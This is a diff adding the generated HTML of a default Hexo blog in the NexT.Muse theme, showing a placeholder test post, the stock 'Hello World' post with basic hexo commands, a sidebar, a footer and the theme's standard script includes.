+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/22/TEST-BLOG/" itemprop="url">TEST BLOG</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-22T12:04:24+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blog-test/" itemprop="url" rel="index">
+                    <span itemprop="name">blog_test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="测试文本"><a href="#测试文本" class="headerlink" title="测试文本"></a>测试文本</h1>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/22/hello-world/" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-22T11:49:13+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="John Doe">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+<br>
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
